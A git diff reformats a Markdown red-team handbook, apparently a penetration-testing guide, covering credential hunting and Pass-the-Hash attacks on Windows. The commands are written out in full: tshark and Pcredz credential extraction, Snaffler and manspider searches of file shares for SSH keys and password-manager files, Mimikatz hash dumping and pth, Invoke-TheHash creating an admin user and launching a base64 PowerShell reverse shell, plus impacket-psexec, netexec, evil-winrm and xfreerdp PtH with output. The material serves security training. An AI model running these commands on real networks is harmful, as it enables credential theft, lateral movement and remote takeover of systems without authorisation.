-| `tshark -r file.pcap -Y "frame contains 'password'"` | Search for passwords in cleartext |
-| `tshark -r file.pcap -Y "dns.qry.name ~ '(malware\|exploit)'"` | Find suspicious domains |
+| Command                                                        | Description                       |
+| -------------------------------------------------------------- | --------------------------------- |
+| `tshark -r file.pcap -Y "frame matches '[0-9]{13,16}'"`        | Find credit card numbers          |
+| `tshark -r file.pcap -Y "frame contains 'password'"`           | Search for passwords in cleartext |
+| `tshark -r file.pcap -Y "dns.qry.name ~ '(malware\|exploit)'"` | Find suspicious domains           |
 
 </details>
 
 <details>
 <summary><h4>8. Advanced Decoding</h4></summary>
 
-| Command | Description |
-|---------|-------------|
-| `tshark -r file.pcap -o "tls.keylog_file:sslkeylog.log"` | Decrypt TLS with keylog file |
-| `tshark -r file.pcap -Y "smb2.cmd == 5" -V` | Analyze SMB2 commands in detail |
+| Command                                                  | Description                     |
+| -------------------------------------------------------- | ------------------------------- |
+| `tshark -r file.pcap -o "tls.keylog_file:sslkeylog.log"` | Decrypt TLS with keylog file    |
+| `tshark -r file.pcap -Y "smb2.cmd == 5" -V`              | Analyze SMB2 commands in detail |
 
 </details>
 
 <details>
 <summary><h4>9. Pro Tips</h4></summary>
 
-| Command | Description |
-|---------|-------------|
-| `tshark -G fields \| less` | List all available fields |
-| `tshark -i eth0 -Y "http" -l` | Real-time traffic analysis |
+| Command                                                 | Description                |
+| ------------------------------------------------------- | -------------------------- |
+| `tshark -G fields \| less`                              | List all available fields  |
+| `tshark -i eth0 -Y "http" -l`                           | Real-time traffic analysis |
 | `tshark -r file.pcap -V \| grep -A 10 -B 10 "password"` | Complex searches with grep |
 
 </details>
@@ -6251,15 +6242,15 @@ One way to do this is by using a display filter such as http contains "passw". A
 
 Pcredz is a tool that can be used to extract credentials from live traffic or network packet captures. Specifically, it supports extracting the following information:
 
-* Credit card numbers
-* POP credentials
-* SMTP credentials
-* IMAP credentials
-* SNMP community strings
-* FTP credentials
-* Credentials from HTTP NTLM/Basic headers, as well as HTTP Forms
-* NTLMv1/v2 hashes from various traffic including DCE-RPC, SMBv1/2, LDAP, MSSQL, and HTTP
-* Kerberos (AS-REQ Pre-Auth etype 23) hashes
+- Credit card numbers
+- POP credentials
+- SMTP credentials
+- IMAP credentials
+- SNMP community strings
+- FTP credentials
+- Credentials from HTTP NTLM/Basic headers, as well as HTTP Forms
+- NTLMv1/v2 hashes from various traffic including DCE-RPC, SMBv1/2, LDAP, MSSQL, and HTTP
+- Kerberos (AS-REQ Pre-Auth etype 23) hashes
 
 1. **Install** Pcredz
 
@@ -6351,14 +6342,14 @@ python3 ./Pcredz -i eth0 -v
 </tr>
 </table>
 
-| Option               | Description                                                                 | Example Usage                          |
-|----------------------|-----------------------------------------------------------------------------|----------------------------------------|
-| `-h`, `--help`       | Shows a help message                                             | `pcredz -h`                            |
-| `-f capture.pcap`    | Parse a specific pcap file                                                  | `pcredz -f traffic.pcap`               |
-| `-d /path/to/pcaps/` | Recursively parse all pcap files in directory                               | `pcredz -d /home/pnt/pcap/`            |
-| `-i eth0`            | Specify network interface for live capture                                  | `pcredz -i eth0`                       |
-| `-v`                 | Enable verbose output (more detailed information)                           | `pcredz -f traffic.pcap -v`            |
-| `-o output_dir`      | Store log files in custom directory instead of default Pcredz location      | `pcredz -f traffic.pcap -o /tmp/logs/` |
+| Option               | Description                                                            | Example Usage                          |
+| -------------------- | ---------------------------------------------------------------------- | -------------------------------------- |
+| `-h`, `--help`       | Shows a help message                                                   | `pcredz -h`                            |
+| `-f capture.pcap`    | Parse a specific pcap file                                             | `pcredz -f traffic.pcap`               |
+| `-d /path/to/pcaps/` | Recursively parse all pcap files in directory                          | `pcredz -d /home/pnt/pcap/`            |
+| `-i eth0`            | Specify network interface for live capture                             | `pcredz -i eth0`                       |
+| `-v`                 | Enable verbose output (more detailed information)                      | `pcredz -f traffic.pcap -v`            |
+| `-o output_dir`      | Store log files in custom directory instead of default Pcredz location | `pcredz -f traffic.pcap -o /tmp/logs/` |
 
 </details>
 
@@ -6373,12 +6364,12 @@ Network shares in corporate environments often contain sensitive data inadverten
 
 As a quick reminder, here are some general tips:
 
-* Look for keywords within files such as `passw`, `user`, `token`, `key`, and `secret`.
-* Search for files with extensions commonly associated with stored credentials, such as `.ini`, `.cfg`, `.env`, `.xlsx`, `.ps1`, and `.bat`.
-* Watch for files with "interesting" names that include terms like `config`, `user`, `passw`, `cred`, or `initial`.
-* If you're trying to locate credentials within the `DOMAINNAME.LOCAL` domain, it may be helpful to search for files containing the string `DOMAINNAME\`.
-* Keywords should be localized based on the target; if you are attacking a German company, it's more likely they will reference a `Benutzer` than a `User`.
-* Pay attention to the shares you are looking at, and be strategic. If you scan ten shares with thousands of files each, it's going to take a signifcant amount of time. Shares used by IT employees might be a more valuable target than those used for company photos.
+- Look for keywords within files such as `passw`, `user`, `token`, `key`, and `secret`.
+- Search for files with extensions commonly associated with stored credentials, such as `.ini`, `.cfg`, `.env`, `.xlsx`, `.ps1`, and `.bat`.
+- Watch for files with "interesting" names that include terms like `config`, `user`, `passw`, `cred`, or `initial`.
+- If you're trying to locate credentials within the `DOMAINNAME.LOCAL` domain, it may be helpful to search for files containing the string `DOMAINNAME\`.
+- Keywords should be localized based on the target; if you are attacking a German company, it's more likely they will reference a `Benutzer` than a `User`.
+- Pay attention to the shares you are looking at, and be strategic. If you scan ten shares with thousands of files each, it's going to take a signifcant amount of time. Shares used by IT employees might be a more valuable target than those used for company photos.
 
 <details>
 <summary><h3>Hunting from Windows</h3></summary>
@@ -6452,28 +6443,28 @@ net use Z: \\<IP>\<SHARE_NAME> /user:<DOMAIN>\<USER> <PASSWORD> /persistent:no
 </tr>
 </table>
 
-| Option | Description | Example/Values |
-|--------|-------------|----------------|
-| `-o`   | Output results to a file | `-o C:\users\thing\snaffler.log` |
-| `-s`   | Enable real-time stdout output | `-s` |
-| `-v`   | Verbosity level | `Trace`, `Debug`, `Info` (default), `Data` |
-| `-m`   | Output directory for copying found files | `-m C:\captured_files` |
-| `-l`   | Max file size to copy (bytes) | Default: `10000000` (10MB) |
-| `-i`   | Disable discovery; requires directory path | `-i \\server\share` |
-| `-n`   | Disable computer discovery; specify hosts | `-n 192.168.1.100` or `-n hosts.txt` |
-| `-y`   | TSV-formatted output | `-y` |
-| `-b`   | Skip LAIM rules (0-3) | `-b 2` (medium filtering) |
-| `-f`   | Find shares via DFS only | `-f` |
-| `-a`   | List shares without file enumeration | `-a` |
-| `-u`   | Pull interesting AD accounts for searches | `-u` |
-| `-d`   | Target domain for computer discovery | `-d <DOMAIN>` |
-| `-c`   | Domain controller for queries | `-c DC01.<DOMAIN>` |
-| `-r`   | Max file size to search (bytes) | Default: `500000` (500KB) |
-| `-j`   | Context bytes around found strings | `-j 200` (200 bytes) |
-| `-z`   | Path to config file | `-z config.toml` or `-z generate` |
-| `-t`   | Log output format | `plain` (default) or `json` |
-| `-x`   | Max threads (minimum 4) | `-x 8` |
-| `-p`   | Custom rules directory (.toml files) | `-p C:\custom_rules` |
+| Option | Description                                | Example/Values                             |
+| ------ | ------------------------------------------ | ------------------------------------------ |
+| `-o`   | Output results to a file                   | `-o C:\users\thing\snaffler.log`           |
+| `-s`   | Enable real-time stdout output             | `-s`                                       |
+| `-v`   | Verbosity level                            | `Trace`, `Debug`, `Info` (default), `Data` |
+| `-m`   | Output directory for copying found files   | `-m C:\captured_files`                     |
+| `-l`   | Max file size to copy (bytes)              | Default: `10000000` (10MB)                 |
+| `-i`   | Disable discovery; requires directory path | `-i \\server\share`                        |
+| `-n`   | Disable computer discovery; specify hosts  | `-n 192.168.1.100` or `-n hosts.txt`       |
+| `-y`   | TSV-formatted output                       | `-y`                                       |
+| `-b`   | Skip LAIM rules (0-3)                      | `-b 2` (medium filtering)                  |
+| `-f`   | Find shares via DFS only                   | `-f`                                       |
+| `-a`   | List shares without file enumeration       | `-a`                                       |
+| `-u`   | Pull interesting AD accounts for searches  | `-u`                                       |
+| `-d`   | Target domain for computer discovery       | `-d <DOMAIN>`                              |
+| `-c`   | Domain controller for queries              | `-c DC01.<DOMAIN>`                         |
+| `-r`   | Max file size to search (bytes)            | Default: `500000` (500KB)                  |
+| `-j`   | Context bytes around found strings         | `-j 200` (200 bytes)                       |
+| `-z`   | Path to config file                        | `-z config.toml` or `-z generate`          |
+| `-t`   | Log output format                          | `plain` (default) or `json`                |
+| `-x`   | Max threads (minimum 4)                    | `-x 8`                                     |
+| `-p`   | Custom rules directory (.toml files)       | `-p C:\custom_rules`                       |
 
 > **NOTE:** The real power is in Snaffler's ability to chain multiple rules together, and even create branching chains. This allows us to use "cheap" rules like checking file names and extensions to decide when to use "expensive" rules like running regexen across the contents of files, parsing certs to see whether they contain private keys, etc.
 
@@ -6485,9 +6476,9 @@ Snaffler comes with a set of default rules baked into the `.exe`. You can see th
 
 Custom Rules:
 
-*Option 1:* Edit or replace the rules in the `DefaultRules` directory, then build a fresh Snaffler. The `.toml` files in that dir will get baked into the `.exe` as resources, and loaded up at runtime whenever you don't specify any other rules to use.
+_Option 1:_ Edit or replace the rules in the `DefaultRules` directory, then build a fresh Snaffler. The `.toml` files in that dir will get baked into the `.exe` as resources, and loaded up at runtime whenever you don't specify any other rules to use.
 
-*Option 2:* Make a directory and stick a bunch of your own rule files in there, then run Snaffler with `-p .\path\to\rules`. Snaffler will parse all the `.toml` files in that directory and use the resulting ruleset. This will also work if you just have them all in one big `.toml` file.
+_Option 2:_ Make a directory and stick a bunch of your own rule files in there, then run Snaffler with `-p .\path\to\rules`. Snaffler will parse all the `.toml` files in that directory and use the resulting ruleset. This will also work if you just have them all in one big `.toml` file.
 
 </details>
 
@@ -6500,7 +6491,7 @@ The script can be found in the Github repo or [`here`](../scripts/passwords/Powe
 
 **Setup Commands**
 
-Below is a list of commands that can be used to load PowerHuntShares into your current PowerShell session. Please note that one of these will have to be run each time you run PowerShell is run. *It is not persistent.*
+Below is a list of commands that can be used to load PowerHuntShares into your current PowerShell session. Please note that one of these will have to be run each time you run PowerShell is run. _It is not persistent._
 
 **Option 1: Local module**
 
@@ -6797,40 +6788,40 @@ docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 1
 
 > **NOTE:** Matching files are automatically downloaded into `$HOME/.manspider/loot`! (`-n` to disable)
 
-| Example | Command |
-|---------|---------|
-| Search network for credential filenames | `manspider 192.168.0.0/24 -f <KEY_WORD1> <KEY_WORD2> -d <corp> -u <USER> -p <PASSWORD>` |
-| Search spreadsheets by filename | `manspider <SHARE>.<corp.local> -f <KEY_WORD> -e xlsx csv -d <corp> -u <USER> -p <PASSWORD>` |
-| Search documents by content | `manspider <SHARE>.<corp.local> -c <KEY_WORD> -e doc docx pdf -d <corp> -u <USER> -p <PASSWORD>` |
-| Search interesting extensions | `manspider <SHARE>.<corp.local> -e bat vbs ps1 pem key pfx cfg conf vmdk dit -d <corp> -u <USER> -p <PASSWORD>` |
-| Search finance directories | `manspider <SHARE>.<corp.local> --dirnames bank financ payable -f '[0-9]{5,}' -d <corp> -u <USER> -p <PASSWORD>` |
-| Search SSH keys by filename | `manspider <SHARE>.<corp.local> -e ppk rsa pem -f id_rsa id_dsa -d <corp> -u <USER> -p <PASSWORD>` |
-| Search SSH keys by content | `manspider <SHARE>.<corp.local> -e '' -c 'BEGIN .{1,10} PRIVATE KEY' -d <corp> -u <USER> -p <PASSWORD>` |
+| Example                                 | Command                                                                                                          |
+| --------------------------------------- | ---------------------------------------------------------------------------------------------------------------- |
+| Search network for credential filenames | `manspider 192.168.0.0/24 -f <KEY_WORD1> <KEY_WORD2> -d <corp> -u <USER> -p <PASSWORD>`                          |
+| Search spreadsheets by filename         | `manspider <SHARE>.<corp.local> -f <KEY_WORD> -e xlsx csv -d <corp> -u <USER> -p <PASSWORD>`                     |
+| Search documents by content             | `manspider <SHARE>.<corp.local> -c <KEY_WORD> -e doc docx pdf -d <corp> -u <USER> -p <PASSWORD>`                 |
+| Search interesting extensions           | `manspider <SHARE>.<corp.local> -e bat vbs ps1 pem key pfx cfg conf vmdk dit -d <corp> -u <USER> -p <PASSWORD>`  |
+| Search finance directories              | `manspider <SHARE>.<corp.local> --dirnames bank financ payable -f '[0-9]{5,}' -d <corp> -u <USER> -p <PASSWORD>` |
+| Search SSH keys by filename             | `manspider <SHARE>.<corp.local> -e ppk rsa pem -f id_rsa id_dsa -d <corp> -u <USER> -p <PASSWORD>`               |
+| Search SSH keys by content              | `manspider <SHARE>.<corp.local> -e '' -c 'BEGIN .{1,10} PRIVATE KEY' -d <corp> -u <USER> -p <PASSWORD>`          |
 
 Example #8: Search for password manager files
 
-| Extension       | Password Manager                          |
-|-----------------|------------------------------------------|
-| `.kdbx`       | KeePass, KeePassXC                       |
-| `.kdb`       | KeePass Classic                          |
-| `.1pif`       | 1Password                                |
-| `.agilekeychain` | 1Password                              |
-| `.opvault`    | 1Password                                |
-| `.lpd`        | LastPass                                 |
-| `.dashlane`   | Dashlane                                 |
-| `.psafe3`     | Password Safe                            |
-| `.enpass`     | Enpass                                   |
-| `.bwdb`       | Bitwarden                                |
-| `.msecure`    | mSecure                                  |
-| `.stickypass` | Sticky Password                          |
-| `.pwm`       | Password Memory                          |
-| `.rdb`        | RoboForm                                 |
-| `.safe`      | SafeInCloud                              |
-| `.zps`       | Zoho Vault                               |
-| `.pmvault`    | SplashID Safe                            |
-| `.mywallet`   | MyWallet                                 |
-| `.jpass`      | JPass                                    |
-| `.pwmdb`     | Universal Password Manager               |
+| Extension        | Password Manager           |
+| ---------------- | -------------------------- |
+| `.kdbx`          | KeePass, KeePassXC         |
+| `.kdb`           | KeePass Classic            |
+| `.1pif`          | 1Password                  |
+| `.agilekeychain` | 1Password                  |
+| `.opvault`       | 1Password                  |
+| `.lpd`           | LastPass                   |
+| `.dashlane`      | Dashlane                   |
+| `.psafe3`        | Password Safe              |
+| `.enpass`        | Enpass                     |
+| `.bwdb`          | Bitwarden                  |
+| `.msecure`       | mSecure                    |
+| `.stickypass`    | Sticky Password            |
+| `.pwm`           | Password Memory            |
+| `.rdb`           | RoboForm                   |
+| `.safe`          | SafeInCloud                |
+| `.zps`           | Zoho Vault                 |
+| `.pmvault`       | SplashID Safe              |
+| `.mywallet`      | MyWallet                   |
+| `.jpass`         | JPass                      |
+| `.pwmdb`         | Universal Password Manager |
 
 | Search password manager files | `manspider <SHARE>.<corp.local> -e kdbx kdb 1pif opvault psafe3 enpass bwdb -d <corp> -u <USER> -p <PASSWORD>` |
 | Search certificates | `manspider <SHARE>.<corp.local> -e pfx p12 pem crt cer csr jks keystore der -d <corp> -u <USER> -p <PASSWORD>` |
@@ -6882,9 +6873,9 @@ A [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) attack i
 
 The attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:
 
-* Dumping the local SAM database from a compromised host.
-* Extracting hashes from the NTDS database (`ntds.dit`) on a Domain Controller.
-* Pulling the hashes from memory (`lsass.exe`).
+- Dumping the local SAM database from a compromised host.
+- Extracting hashes from the NTDS database (`ntds.dit`) on a Domain Controller.
+- Pulling the hashes from memory (`lsass.exe`).
 
 <details>
 <summary><h3>Introduction to Windows NTLM Authentication</h3></summary>
@@ -6893,17 +6884,17 @@ NTLM (New Technology LAN Manager) is a legacy security protocol used by Microsof
 
 **Key Characteristics**
 
-* Still in Use: Maintained for backward compatibility with legacy systems.
+- Still in Use: Maintained for backward compatibility with legacy systems.
 
-* Replaced by Kerberos: Windows 2000+ domains default to Kerberos, but NTLM persists in many environments.
+- Replaced by Kerberos: Windows 2000+ domains default to Kerberos, but NTLM persists in many environments.
 
 **Why NTLM Remains Relevant**
 
-* Legacy system dependencies
+- Legacy system dependencies
 
-* Fallback mechanism when Kerberos fails
+- Fallback mechanism when Kerberos fails
 
-* Still enabled in many Active Directory environments
+- Still enabled in many Active Directory environments
 
 </details>
 
@@ -6912,29 +6903,77 @@ NTLM (New Technology LAN Manager) is a legacy security protocol used by Microsof
 
 The first tool we will use to perform a Pass the Hash attack is [Mimikatz](https://github.com/gentilkiwi). Mimikatz has a module named sekurlsa::pth that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password.
 
-* **USER** - The user name we want to impersonate.
-* **HASH_TYPE** - NTLM or rc4.
-* **HASH** - NTLM or rc4 hash of the user's password.
-* **DOMAIN** - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
+- **USER** - The user name we want to impersonate.
+- **HASH_TYPE** - NTLM or rc4.
+- **HASH** - NTLM or rc4 hash of the user's password.
+- **DOMAIN** - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
 
-**Start Mimikatz as Adminitrator**
+1. **Start** Mimikatz as Administrator.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 mimikatz.exe
 ```
 
-**Get the hashes**
+</td>
+</tr>
+</table>
 
-```cmd
-mimikatz # privilege::debug
-mimikatz # sekurlsa::logonpasswords
+2. **Get** the hashes.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🔑 <b>Mimikatz</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`mimikatz #`**
+
+</td>
+<td>
+
+```
+privilege::debug
+sekurlsa::logonpasswords
 ```
 
-**Run a CMD as th desired user**
+</td>
+</tr>
+</table>
+
+3. **Run** a CMD as the desired user.
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
 
 ```cmd
 mimikatz.exe privilege::debug "sekurlsa::pth /user:<USER> /<HASH_TYPE>:<HASH> /domain:<corp.rth> /run:cmd.exe" exit
 ```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -6945,27 +6984,63 @@ Another tool we can use to perform Pass the Hash attacks on Windows is [Invoke-T
 
 When using Invoke-TheHash, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:
 
-* **Target** - Hostname or IP address of the target.
-* **Username** - Username to use for authentication.
-* **Domain** - Domain to use for authentication. *This parameter is unnecessary with local accounts or when using the @domain after the username.*
-* Hash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
-* **Command** - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.
+- **Target** - Hostname or IP address of the target.
+- **Username** - Username to use for authentication.
+- **Domain** - Domain to use for authentication. _This parameter is unnecessary with local accounts or when using the @domain after the username._
+- Hash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
+- **Command** - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.
 
 <details>
 <summary><h4>Invoke-TheHash with SMB</h4></summary>
 
-**Import the module**
+1. **Import** the module.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\>`**
+
+</td>
+<td>
 
 ```powershell
 Import-Module .\Invoke-TheHash.psd1
 ```
 
-**Create a new user and add it to the Adminitrators group**
+</td>
+</tr>
+</table>
+
+2. **Create** a new user and add it to the Administrators group.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\>`**
+
+</td>
+<td>
 
 ```powershell
 Invoke-SMBExec -Target <IP> -Domain <corp.rth> -Username <USER> -Hash <NTLM_HASH> -Command "net user <NEW_USER> <NEW_PASSWORD> /add && net localgroup administrators <NEW_USER> /add" -Verbose
 ```
-```powershell
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
 VERBOSE: [+] <corp.rth>\<USER> successfully authenticated on <IP>
 VERBOSE: <corp.rth>\<USER> has Service Control Manager write privilege on <IP>
 VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on <IP>
@@ -6974,6 +7049,10 @@ VERBOSE: [*] Trying to execute command on <IP>
 VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on <IP>
 ```
 
+</td>
+</tr>
+</table>
+
 We can also get a reverse shell connection in the target machine.
 
 </details>
@@ -6981,29 +7060,77 @@ We can also get a reverse shell connection in the target machine.
 <details>
 <summary><h4>Netcat listener</h4></summary>
 
-**Start Netcat**
+1. **Start** Netcat listener on the attack host.
 
-```cmd
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
 .\nc.exe -lvnp <PORT>
 ```
 
-**Generate the payload**
+</td>
+</tr>
+</table>
 
-To create a simple reverse shell using PowerShell, we can visit [revshells.com](https://www.revshells.com/), set our IP and port, and select the option *PowerShell #3 (Base64)*.
+2. **Generate** the payload.
+
+To create a simple reverse shell using PowerShell, we can visit [revshells.com](https://www.revshells.com/), set our IP and port, and select the option _PowerShell #3 (Base64)_.
 
 To perform Pass-the-Hash (PtH) execution of a PowerShell reverse shell on the target DC01, use the following syntax with Invoke-TheHash:
 
-**Import the module**
+3. **Import** the module.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\>`**
+
+</td>
+<td>
 
 ```powershell
 Import-Module .\Invoke-TheHash.psd1
 ```
 
-**Excute the reverse shell**
+</td>
+</tr>
+</table>
+
+4. **Execute** the reverse shell.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\>`**
+
+</td>
+<td>
 
 ```powershell
 Invoke-WMIExec -Target DC01 -Domain <corp.rth> -Username <USER> -Hash <NTLM_HASH> -Command "powershell -e <BASE64_PAYLOAD>"
 ```
+
+</td>
+</tr>
+</table>
 
 The result is a reverse shell connection from the DC01 host.
 
@@ -7016,9 +7143,25 @@ The result is a reverse shell connection from the DC01 host.
 
 We'll use Impacket's `psexec.py` to execute commands on the target system.
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 impacket-psexec Administrator@<IP> -hashes :30B3783CE2ABF1AF70F77D0660CF3453
 ```
+
+</td>
+</tr>
+</table>
 
 Impacket’s PsExec uploads a small helper (RemComSvc) to a writable admin share (e.g., ADMIN$ or C$), then creates and runs a Windows service using Service Control Manager. This requires both an admin account and write permission to the share.
 
@@ -7026,9 +7169,9 @@ Impacket’s PsExec uploads a small helper (RemComSvc) to a writable admin share
 
 There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:
 
-* [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
-* [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
-* [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)
+- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
+- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
+- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)
 
 </details>
 
@@ -7037,38 +7180,86 @@ There are several other tools in the Impacket toolkit we can use for command exe
 
 NetExec is a powerful post-exploitation tool designed to automate security testing across large Active Directory environments. Its capabilities include:
 
-* **Credential Validation**: Tests authentication across network hosts to identify systems where provided credentials grant local admin access
-* **Password Spraying**: Attempts single login attempts across multiple hosts using provided credentials
-* **Lockout Avoidance**: Supports local account testing to minimize domain account lockout risks
+- **Credential Validation**: Tests authentication across network hosts to identify systems where provided credentials grant local admin access
+- **Password Spraying**: Attempts single login attempts across multiple hosts using provided credentials
+- **Lockout Avoidance**: Supports local account testing to minimize domain account lockout risks
 
 > **NOTE:** Always verify the target domain's account lockout policy before conducting password spraying tests.
 
 **Start netexec**
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 netexec smb 172.16.1.0/24 -u Administrator -d . -H <HASH>
 ```
-```bash
-# SMB         <DOMAIN_IP_1>   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
-# SMB         <DOMAIN_IP_1>   445    DC01             [-] .\Administrator:<HASH> STATUS_LOGON_FAILURE 
-# SMB         <DOMAIN_IP_2>   445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:False)
-# SMB         <DOMAIN_IP_2>   445    MS01             [+] .\Administrator <HASH> (Pwn3d!)
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
 ```
+SMB         <DOMAIN_IP_1>   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
+SMB         <DOMAIN_IP_1>   445    DC01             [-] .\Administrator:<HASH> STATUS_LOGON_FAILURE
+SMB         <DOMAIN_IP_2>   445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:False)
+SMB         <DOMAIN_IP_2>   445    MS01             [+] .\Administrator <HASH> (Pwn3d!)
+```
+
+</td>
+</tr>
+</table>
 
 <details>
 <summary><h4>Command Execution</h4></summary>
 
 We can use the option -x to execute commands.
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 netexec smb <IP> -u Administrator -d . -H <HASH> -x whoami
 ```
-```bash
-# SMB         <IP>  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
-# SMB         <IP>  445    MS01            [+] .\Administrator <HASH> (Pwn3d!)
-# SMB         <IP>  445    MS01            [+] Executed command 
-# SMB         <IP>  445    MS01            MS01\administrator
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
 ```
+SMB         <IP>  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
+SMB         <IP>  445    MS01            [+] .\Administrator <HASH> (Pwn3d!)
+SMB         <IP>  445    MS01            [+] Executed command
+SMB         <IP>  445    MS01            MS01\administrator
+```
+
+</td>
+</tr>
+</table>
 
 </details>
 
@@ -7079,31 +7270,55 @@ netexec smb <IP> -u Administrator -d . -H <HASH> -x whoami
 
 Evil-WinRM provides an alternative to SMB for Pass-the-Hash (PtH) attacks when:
 
-* SMB ports are blocked, filtered, or shares aren’t writable
-* You don’t have admin rights over SMB
-* PowerShell Remoting (WinRM) is enabled (TCP 5985/5986)
+- SMB ports are blocked, filtered, or shares aren’t writable
+- You don’t have admin rights over SMB
+- PowerShell Remoting (WinRM) is enabled (TCP 5985/5986)
 
 Evil‑WinRM leverages WinRM (PowerShell Remoting) over HTTP(S) and doesn’t require SMB writable shares or service creation.
 
 As long as the account belongs to Remote Management Users or equivalent, you can authenticate using an NTLM hash and spawn a remote PowerShell session.
 
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
 ```bash
 evil-winrm -i <IP> -u <USER> -H <HASH>
 ```
-```bash
-# Evil-WinRM shell v3.3
 
-# Info: Establishing connection to remote endpoint
+</td>
+</tr>
+<tr>
+<td colspan="2">
 
-# *Evil-WinRM* PS C:\Users\Administrator\Documents>
+---
+
 ```
+Evil-WinRM shell v3.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
+
+</td>
+</tr>
+</table>
 
 </details>
 
 <details>
 <summary><h3>Pass the Hash with RDP (Linux)</h3></summary>
 
-We can perform an RDP PtH attack to gain GUI access to the target system using tools like *xfreerdp*.
+We can perform an RDP PtH attack to gain GUI access to the target system using tools like _xfreerdp_.
 
 The target host must have Restricted Admin Mode enabled. If disabled (default configuration), the attack will fail with the error:
 
@@ -7111,15 +7326,47 @@ The target host must have Restricted Admin Mode enabled. If disabled (default co
 
 This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of `0`. It can be done using the following command:
 
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>cmd — Windows - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\>`**
+
+</td>
+<td>
+
 ```cmd
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
 
-Once the registry key is added, we can use *xfreerdp* with the option /pth to gain RDP access:
+</td>
+</tr>
+</table>
+
+Once the registry key is added, we can use _xfreerdp_ with the option /pth to gain RDP access:
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
 
 ```bash
 xfreerdp  /v:<IP> /u:'<USER>' /pth:<HASH>
 ```
+
